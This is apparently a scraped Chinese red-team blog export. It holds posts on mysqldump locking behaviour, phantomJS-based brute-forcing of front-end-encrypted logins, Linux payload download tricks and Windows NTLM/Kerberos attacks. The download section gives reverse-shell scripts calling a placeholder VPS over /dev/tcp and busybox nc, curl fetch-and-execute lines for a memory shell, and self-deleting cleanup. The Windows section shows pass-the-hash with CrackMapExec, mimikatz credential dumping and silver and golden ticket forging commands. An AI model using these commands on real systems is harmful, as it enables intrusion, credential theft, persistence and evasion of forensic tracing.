*/2021-06-03T10:33:06.147069+08:00   1893 Query  /*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */2021-06-03T10:33:06.147165+08:00   1893 Query  FLUSH TABLES2021-06-03T10:33:06.182528+08:00   1893 Query  FLUSH TABLES WITH READ LOCK2021-06-03T10:33:06.182675+08:00   1893 Query  SHOW VARIABLES LIKE &#x27;gtid\\_mode&#x27;2021-06-03T10:33:06.184634+08:00   1893 Query  SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = &#x27;UNDO LOG&#x27; AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = &#x27;DATAFILE&#x27; AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN (&#x27;test&#x27;))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME2021-06-03T10:33:06.192668+08:00   1893 Query  SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = &#x27;DATAFILE&#x27; AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN (&#x27;test&#x27;)) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME2021-06-03T10:33:06.194757+08:00   1893 Query  SHOW VARIABLES LIKE &#x27;ndbinfo\\_version&#x27;2021-06-03T10:33:06.196137+08:00   1893 Init DB  test2021-06-03T10:33:06.196195+08:00   1893 Query  show tables2021-06-03T10:33:06.196398+08:00   1893 Query  show table status like &#x27;t\\_test&#x27;2021-06-03T10:33:06.196592+08:00   1893 Query  SET SQL_QUOTE_SHOW_CREATE=12021-06-03T10:33:06.196634+08:00   1893 Query  SET SESSION character_set_results = &#x27;binary&#x27;2021-06-03T10:33:06.196667+08:00   1893 Query  show create table `t\\_test`2021-06-03T10:33:06.196748+08:00   1893 Query  SET SESSION character_set_results = &#x27;utf8&#x27;2021-06-03T10:33:06.196808+08:00   1893 Query  show fields from `t\\_test`2021-06-03T10:33:06.197078+08:00   1893 Query  show fields from `t\\_test`2021-06-03T10:33:06.197273+08:00   1893 Query  SELECT /*!40001 SQL_NO_CACHE */ * FROM `test`2021-06-03T10:33:06.197395+08:00   1893 Query  SET SESSION character_set_results = &#x27;binary&#x27;2021-06-03T10:33:06.197429+08:00   1893 Query  use `test`2021-06-03T10:33:06.197462+08:00   1893 Query  select @@collation_database2021-06-03T10:33:06.197507+08:00   1893 Query  SHOW TRIGGERS LIKE &#x27;t\\_&#x27;2021-06-03T10:33:06.197791+08:00   1893 Query  SET SESSION character_set_results = &#x27;utf8&#x27;...2021-06-03T10:33:06.458820+08:00   1893 Quit\n\n​    他会在开始，执行一次FLUSH TABLES WITH READ LOCK，在导出完成，退出会话的时候，自动释放读锁。\nmysqldump -udumper -pdumper --single-transaction test\n\n​    在开始执行了SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ，设置了RR隔离级别，并通过START TRANSACTION /*!40100 WITH CONSISTENT SNAPSHOT */，开启了事务，UNLOCK TABLES解锁了所有的表，我们能注意到，他在执行导出操作前，设置了还原点，SAVEPOINT sp，并且在每张表的导出操作前，都执行了ROLLBACK TO SAVEPOINT sp，回到还原点，通过这种操作，保证了读数据的一致性，导出所有的表，然后再执行了RELEASE SAVEPOINT sp。\n2021-06-03T11:07:08.423617+08:00   1899 Connect  root@localhost on  using Socket2021-06-03T11:07:08.423747+08:00   1899 Query  /*!40100 SET @@SQL_MODE=&#x27;&#x27; */2021-06-03T11:07:08.423816+08:00   1899 Query  /*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */2021-06-03T11:07:08.423892+08:00   1899 Query  SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ2021-06-03T11:07:08.423940+08:00   1899 Query  START TRANSACTION /*!40100 WITH CONSISTENT SNAPSHOT */2021-06-03T11:07:08.424145+08:00   1899 Query  SHOW VARIABLES LIKE &#x27;gtid\\_mode&#x27;2021-06-03T11:07:08.426431+08:00   1899 Query  UNLOCK TABLES2021-06-03T11:07:08.426624+08:00   1899 Query  SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = &#x27;UNDO LOG&#x27; AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = &#x27;DATAFILE&#x27; AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN (&#x27;test&#x27;))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME2021-06-03T11:07:08.431603+08:00   1899 Query  SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = &#x27;DATAFILE&#x27; AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN (&#x27;test&#x27;)) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME2021-06-03T11:07:08.433579+08:00   1899 Query  SHOW VARIABLES LIKE &#x27;ndbinfo\\_version&#x27;2021-06-03T11:07:08.434791+08:00   1899 Init DB  test2021-06-03T11:07:08.434852+08:00   1899 Query  SAVEPOINT sp2021-06-03T11:07:08.434906+08:00   1899 Query  show tables2021-06-03T11:07:08.435113+08:00   1899 Query  show table status like &#x27;t\\_test&#x27;2021-06-03T11:07:08.435337+08:00   1899 Query  SET SQL_QUOTE_SHOW_CREATE=12021-06-03T11:07:08.435388+08:00   1899 Query  SET SESSION character_set_results = &#x27;binary&#x27;2021-06-03T11:07:08.435434+08:00   1899 Query  show create table `t\\_test`2021-06-03T11:07:08.435509+08:00   1899 Query  SET SESSION character_set_results = &#x27;utf8&#x27;2021-06-03T11:07:08.435567+08:00   1899 Query  show fields from `t\\_test`2021-06-03T11:07:08.435859+08:00   1899 Query  show fields from `t\\_test`2021-06-03T11:07:08.436082+08:00   1899 Query  SELECT /*!40001 SQL_NO_CACHE */ * FROM `test`2021-06-03T11:07:08.436228+08:00   1899 Query  SET SESSION character_set_results = &#x27;binary&#x27;2021-06-03T11:07:08.436295+08:00   1899 Query  use `test`2021-06-03T11:07:08.436346+08:00   1899 Query  select @@collation_database2021-06-03T11:07:08.436406+08:00   1899 Query  SHOW TRIGGERS LIKE &#x27;t\\_test&#x27;2021-06-03T11:07:08.436702+08:00   1899 Query  SET SESSION character_set_results = &#x27;utf8&#x27;2021-06-03T11:07:08.436765+08:00   1899 Query  ROLLBACK TO SAVEPOINT sp...2021-06-03T11:07:08.624624+08:00   1899 Query  ROLLBACK TO SAVEPOINT sp2021-06-03T11:07:08.624650+08:00   1899 Query  RELEASE SAVEPOINT sp2021-06-03T11:07:08.662944+08:00   1899 Quit\n\n​    从导出过程对数据库正常使用的影响程度上，–single-transaction&lt;–lock-all-tables&lt;–lock-tables，依次递减，如果从数据一致性的角度，推荐使用–single-transaction。\n参考：https://blog.csdn.net/bisal/article/details/118917808\n​    脱某个表和多个表:\n语法：mysqldump -h1主机名 -p端口 -u用户名 -p密码 库名 表名 表名 &gt;文件名.sql例子：mysqldump -h127.0.0.1 -p3306 -uroot -proot mysql t1 t2 &gt;/data/backup/cmdb_t1_t2.sql\n\n​    同时备份多个库:\n格式：mysqldump -h主机名 -P端口 -u用户名 -p密码 --databases 数据库名1 数据库名2 数据库名3 &gt; 文件名.sql例如：mysqldump -h192.168.1.100 -uroot -ppassword --databases cmdb bbs blog &gt; /data/backup如果不行，试试不要--databases\n\n​    备份数据库结构不备份数据:\n格式：mysqldump -h主机名 -P端口 -u用户名 -p密码 --no-data 数据库名1 数据库名2 数据库名3 &gt; 文件名.sql例如：mysqldump --no-data –databases db1 db2 cmdb &gt; /data/backup/structure.sql\n\n\n前端加密phantomJS​    学习c0ny1师傅的文章，记录一下。原文地址:https://gv7.me/articles/2017/jsEncrypter/\n​    对于前端靶场使用c0ny1师傅提供的靶场。首先在电脑上需要phantomJS软件。phantomJS是一个没有界面的浏览器，除了不能浏览，其他的和正常浏览器一样。使用它来执行我们编写好的脚本。\n​    选择sha1进行，抓包。\n\n​    可看到密码部分加密，我们把靶场里sha1的加密放在phantomJS里运行\n\n​    然后插件连接并测试，即可获得加密后的数据\n\n​    使用数据爆破即可，或者在payload processing里选择插件即可。\n\n​    我们看看JsEncrypter里的内容\n// 加载实现加密算法的js脚本var wasSuccessful = phantom.injectJs(&#x27;sha1.js&#x27;);/*引入实现加密的js文件*/// 处理函数function js_encrypt(payload)&#123;\tvar newpayload;\t/**********在这里编写调用加密函数进行加密的代码************/\tnewpayload = hex_sha1(payload);\t/**********************************************************/\treturn newpayload;&#125;\n\n\n​    通常来说，如果一个网站的 js 文件没有做混淆，并能轻松找到加密函数，且加密算法比较简单的话，其实是不需要导入 js 文件的，可以直接将加密函数复制或者自己编写即可，但是往往加密算法的实现比较复杂，需要引入许多依赖，所以还是导入较好，后续编写加密算法再调用其中的依赖。\n​    以下提供两种解决办法：\n​    1、导入所有js文件\n​    2、通过搜索关键字导入js文件，可搜索encrypt、aes、des、md5、key、iv、rsa等\n​    通过分析得到：\n​    我们可以通过全局搜索接口名称，然后通过路由寻找加密函数，然后一步一步分析。\n​    https://www.cnblogs.com/wjrblogs/p/12850094.html\n定位相关onclick定位法​    有时候在触发提交表单的标签中会存在一个onClik属性，该属性的值正好是一个js函数。而这个函数往往就是我们要找的数据加密函数。我们只需要找到它定义的地方即可。\n\nLinux下载文件​    在渗透的过程中，遇见的bash无法执行怎么办，或者目标机器没有nc怎么办，再或者，等等一系列原因导致无法利用。提供以下几种办法:\n1、curl​    在服务器编写一个脚本 ，脚本的内容是bash反弹，并且删除原脚本，在利用内存马让目标机器去请求执行。\n​    VPS脚本1:\nbash -i &gt;&amp; /dev/tcp/x.x.x.x/8989 0&gt;&amp;1 &amp;rm $0     #删除当前这个脚本\n\n​    VPS记得把脚本用Python起个服务挂起来：\npython3 -m http.server 80\n\n​    VPS上nc开启监听:\nnc -lvp 2333\n\n​    目标机器内存shell执行：\ncurl http://x.x.x.x/1 -o /tmp/1/bin/bash /tmp/1    #建议放到临时目录\n\n​    此处我们看一下curl的用法，所以此时我们不指定为/tmp/1，如果指定为1.sh这样的话，就会直接在当前目录下生成文件。同理，我们如果在拿到shell的情况下，用这个办法变可以写一个🐎上去，而路径及为当前的web路径。\n# -o 参数将服务器的回应保存成文件，等同于 wget 命令。curl -o example.html https://www.example.com#上面命令将 www.example.com 保存成 example.html 。\n\n# -O 参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。curl -O https://www.example.com/foo/bar.html#上面命令将服务器回应保存成文件，文件名为bar.html。\n\n2、busybox​    然后我们就发现，目标没得bash，或者bash权限执行不了，要寄了？采用nc链接，可是目标机器并没有安装nc，所以这时候用到工具 busybox ，集成了linux常用命令和工具。\n​    首先先在自己的VPS上把这busybox下载下来\nwget https://busybox.net/downloads/binaries/1.20.0/busybox-x86_64python3 -m http.server 80\n\n​    vps脚本2（这个脚本2也要放到同级目录下并与busybox一起映射到80服务上）\nif [ ! -f /tmp/busybox ];then  #判断当前机器tmp目录是否以安装busyboxwget http://x.x.x.x/busybox-x86_64 -O /tmp/busybox  #从VPS80端口下载busybox 到tmp目录并取名busyboxchmod +x /tmp/busybox # 添加一个执行权限fi/tmp/busybox nc x.x.x.x 9999 -e /bin/bash &amp;  #用nc连接 9999端口sleep 2  #延迟时间最好不要动rm /tmp/busybox  #删除busyboxrm $0  #删除当前脚本\n\n​    vps开启监听\nnc -lvp 9999\n\n​    目标内存shell执行,让目标机器从VPS上下载脚本2并且执行脚本2的内容并且回弹nc\ncurl http://x.x.x.x/2 -o /tmp/2/bin/bash /tmp/2\n\n\n3、","categories":["红色tips"],"tags":["数据库","其他","防溯源","痕迹清理"]},{"title":"关于Windows协议学习","url":"/2023/03/10/%E5%85%B3%E4%BA%8EWindows%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/","content":"前言​    网络上关于Windows认证方式的学习的文章，在此为了对原理理解更加透彻，现在跟着网上大佬们的资料学习，供以后参考使用。\n本地认证本地认证基础知识​    Windows密码存储地址：%SystemRoot%\\system32\\config\\sam\n​    当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功。这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。\n​    Windows本身不保存明文密码，只保留密码的Hash\n​    为了保证存储的不是明文，从而采用Hash，但是密码Hash也需要特定的生成算法以及表现形式。\nNTLM(NT LAN Manager) Hash​    在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。\n​    NTLM Hash是支持Net NTLM认证协议及本地认证过程中的一个重要参与物，其长度为32位，由数字与字母组成。\nadmin:1003:AAD3B435B51404EEAAD3B435B51404EE:111F54A2A4C0FB3D7CD9B19007809AD6:::\nGuest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::\nAdministrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9A81:::\n\n​    其中冒号分割的前半段AAD3B435B51404EEAAD3B435B51404EE是lm hash，后半段111F54A2A4C0FB3D7CD9B19007809AD6是ntlm hash。前半段放到cmd5解密会发现是空密码，那是因为Windows版本的原因。\n\nNTLM Hash与NTLM​    这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。\n​    NTLM与NTLM Hash相互对应。\n​    在本地认证的过程中，其实是把用户输入的密码转换为NTLM hash与SAM中NTLM hash进行比较。NTLM Hash的前身是LM Hash，目前基本淘汰，但是还是存在。\nNTLM Hash的产生​    密码是admin，那么操作系统会将admin\b转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。\nadmin -&gt; hex(16进制编码) = 61646d696e61646d696e -&gt; Unicode = 610064006d0069006e00610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634\n\n\n\n本地认证流程winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)\n\n​    首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。\n\nWindows Logon Process(即 winlogon.exe)，是Windows NT 用户登陆程序，用于管理用户登录和退出。\nLSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。\n\n\nLM Hash​    在NTLM协议问世\b之前，它对前身就是LM（LAN Manager）协议。LM与NTLM协议的认证机制相同，但是加密算法不同。目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。LM协议认证过程中需要LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：\n将所有小写字母转换为大写字母• &gt;123ABC // 未达到7个字符• 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补• &gt;31323341424300000000000000• 将密码分割为两组7个字节的块• &gt;31323341424300 00000000000000 // 16进制• 将每组转化为比特流，不足56Bit则在左边加0• &gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000• 将比特流按照7比特一组，分出8组，末尾加0由于后者都为0，结果可想而知，那就都是0;• 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。• -&gt; 00110000100110001000110001101000000101000001001000001100 00000000• -&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C• 由于我们的密码不超过7字节，所以后面的一半是固定的:• AA-D3-B4-35-B5-14-04-EE• 连接两个DES加密字符串。这是LM哈希。• 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE\n\n​    由于我们的密码不超过7字节，所以后面的一半是固定的:AA-D3-B4-35-B5-14-04-EE\n​    在上面的产生过程中，脆弱点就在于DES的Key（KGS!@#$%）是固定的，也就是说，有了Key就能够解出原文。\n​    并且根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。\n网络认证​    工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式， 没有信托机构。\n​    假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。\n​    这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445。\n​    早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。\nNTLM 协议​    NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。现在已经到了NTLMv2\n​    这个协议只支持Windows\nChallenge(挑战)/Response(响应)​    NTLM协议的认证过程分为三步：\n\n协商\n质询\n验证\n\n​    协商：主要用于确认双方协议版本\n​    质询：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴，本小节主要讨论这个机制的\b运作流程。\n​    验证：验证主要是在质询完成后，验证结果，是认证的最后一步。\n​    质询的完整过程：\n\n1.客户端向服务器端发送用户信息(用户名)请求\n\n2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。\n\n//第二部可以理解为：Net NTLM Hash = NTLM Hash(Challenge)\n\n3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。\n\n\n​    其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。并且这个NTLM Hash始终没有在网络中传输。\n​    注意:\n​    1. Chanllenge是Server产生的一个16字节的随机数，每次认证都不同\n​    2. Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。\n\nNTLM V2协议​    NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。\n​    具体有什么不同:\n\nChallage:NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。\nNet-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。\n\nNTLM协议延伸​    我们都用过Responder工具，那么其实它就是启动一个NTLM服务端，服务端可以得到客户端发过来的Net-NTLM hash\n\nPass The Hash​    在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过搜集这些信息有助于我们扩大战果，尤其是在域环境下。\n​    哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又想扩大战果的问题。\nPass The Hash - 必要条件\n\n哈希传递需要被认证的主机能够访问到服务器\n哈希传递需要被传递认证的用户名\n哈希传递需要被传递认证用户的NTLM Hash\n\n要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge。其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的 Chanllenge加密，生成一个Response，来完成认证。Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。\nPass The Hash的工具：\n\nSmbmap\nCrackMapExec\nSmbexec\nMetasploit\n\n使用CrackMapExec实现Hash传递：\nroot@kali:# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoamiSMB 192.168.3.5 445 LIYINGZHEA30B[*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B)(domain:PAYLOADS) (signing:False) (SMBv1:True)SMB 192.168.3.5 445 LIYINGZHEA30B[+] PAYLOADS\\administrator dab7de8feeb5ecac65faf9fdc6cac3a9(Pwn3d!)SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed command\n\n\n\nKerberos域认证Active Directory(活动目录)概念​    Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务。\n​    活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。\n\nActive Directory存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。Active Directory使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。\n网络对象分为:用户、用户组、计算机、域、组织单位以及安全策略等。\n\nActive Directory(活动目录)功能\n服务器及客户端计算机管理:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。\n用户服务:管理用户域账户、用户信息、企业通讯录(与电子邮件系统集成)、用户组管理、用户身份认证、用户授权管理等， 按省实施组管理策略。\n资源管理:管理打印机、文件共享服务等网络资源。\n桌面配置:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特 征限制、网络连接限制、安全配置限制等。\n应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办 公自动化、补丁管理、防病毒系统等各种应用系统。\n\n​    在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的\b计算机进行限制，例如：销售部门不能访问技术部门的服务器。\n​    这个中间就需要Kerberos认证协议来验证\b网络对象间的权限。\n域认证体系 - Kerbroes​    Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。\n域认证所参与的角色​    Kerberos的标志是三只狗头，狗头分别代表以下角色：\n\nClient\nServer\nKDC(Key Distribution Center) = DC(Domain Controller)\n\n​    Kerberos认证协议的基础概念：\n​    票据（Ticket）：是网络对象互相访问的凭证。 TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据，是一种临时凭证的存在。\n域认证所参与的角色（KDC）​    KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成：\n\nAuthentication Service（AS）: 为client生成TGT的服务\nTicket Granting Service（TGS）: 为client生成某个服务的ticket\naccount database（AD），存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。\n\n​    从物理层面看，AD与KDC均为域控制器(Domain Controller)。\n\n域认证粗略流程\nclient向kerberos服务请求，希望获取访问server的权限。 kerberos得到了这个消息，首先得判断client是否是可信赖的， 也就是白名单黑名单的说法。这就是AS服务完成的工作，通过在AD中存储黑名单和白名单来区分client。成功后，返回AS返回TGT给client。\nclient得到了TGT后，继续向kerberos请求，希望获取访问 server的权限。kerberos又得到了这个消息，这时候通过client 消息中的TGT，判断出了client拥有了这个权限，给了client访 问server的权限ticket。\nclient得到ticket后，终于可以成功访问server。这个ticket只是 针对这个server，其他server需要向TGS申请。\n\n域认证详细流程\n​    首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。\n​    KDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中某个用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。\n\nSession Key用于客户端向TGS服务通信。\n域内所有网络对象的凭证都在AD中保存\nKDC中某个用户指的是krbtgt\n\n数据结构：\n这是客户端发送请求信息的数据结构：\n\n这是KDC返回数据的结构\n\n​    其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket。\n​    Kerberos是一个假设网络环境不安全的情况下能够正常进行认证工作的协议。\n​    第一步中，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，如果有，我们就可以伪造黄金票据\n\n​    第二步客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。\n​    如果假设这个数据被中间人窃取到，也无法在短时间内破解，因为KDC会校验时间戳。\n​    KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。\n​    验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。\nTicket组成如下：\n​    Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。\n\n\n​    在第三步里，客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。\n\nTicket客户端无法解密\n服务器端通过解密Ticket解密Server Session Key(Client info + Timestamp)\n比较时间长度\n\n​    校验通过后，认证成功，该票据会一直存在客户端内存中。\n其实，TGT的结构和Ticket结构是相同的，只是中间的session key和server session key是不同的，session key是AS给客户端的，而server session key是TGS给客户端的。\n白银票据(Silver Tickets)​    白银票据特点:\n\n1.不需要与KDC进行交互\n2.需要目标服务的NTLM Hash\n\n在第三步认证中的Ticket的组成:\nTicket=Server Hash(Server Session Key+Client info+End Time) \n\n​    当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。\n​    PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。我们只需要知道server的Hash，我们就可以伪造一个票据，但是这个票据只能够在server使用，其他的不能用。\n伪造白银票据(Silver Tickets)​    Other：\n\nkerberos::list #列出票据\nkerberos::purge # 清除票据\n\n​    首先需要导出Server Hash：\nmimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt\n\n​    伪造票据:\nmimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit\n\n​    这个user用户名可以是假的，因为server是不会去验证的。\n​    由于白银票据需要目标服务器的Hash，所以没办法生成对应域内所有服务器的票据，也不能通过TGT申请。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:\n\n\n\n服务注释\n服务名\n\n\n\nWMI\nHOST、RPCSS\n\n\nPowershell Remoteing\nHOST、HTTP\n\n\nWinRM\nHOST、HTTP\n\n\nScheduled Tasks\nHOST\n\n\nLDAP 、DCSync\nLDAP\n\n\nWindows File Share (CIFS)\nCIFS\n\n\nWindows Remote ServerAdministration Tools\nRPCSS、LDAP、CIFS\n\n\n白银票据(Silver Tickets)防御\n1.尽量保证服务器凭证不被窃取\n2.开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。\n\n开启方式:\n将注册表中\nHKEY_LOCAL_MACHINE\\SYSTEM \\ CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters\n\n中的ValidateKdcPacSignature设置为1。\n黄金票据(Golden Tickets)黄金票据特点:\n\n1.需要与DC通信\n2.需要krbtgt用户的hash\n\nPS:这里的krbtgt hash就是之前讲的KDC Hash\n\n黄金票据(Golden Tickets)-MSF kiwi​    使用meterpreter中的kiwi模块：\nload kiwi\n\n​    创建票据：\n\n\n\n使用wmic在目标服务器上创建一个进程：\n\n黄金票据(Golden Tickets) - 伪造伪造票据:\nmimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit\n\n\n\nTickets 总结\n黄金票据:从攻击面来看，获取krbtgt用户的hash后，可以在域中进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限， 使用黄金票据能够在一个域环境中长时间控制整个域。\n从防御角度来看，需要经常更新krbtgt的密码，才能够使得原有的票据失效。最根本的办法是不允许域管账户登录其他服务器。\n白银票据:从攻击面来看，伪造白银票据的难度比伪造黄金票据的 难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储Server。\n从防御角度来看，需要开启PAC认证，但这会降低认证效率，增加 DC的负担，最根本的还是要加固服务器本身对外的服务。\n\nWindows Access TokenWindows Access Token 简介​    Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。\n​    Access Token种类：\n\n主令牌\n模拟令牌\n\n​    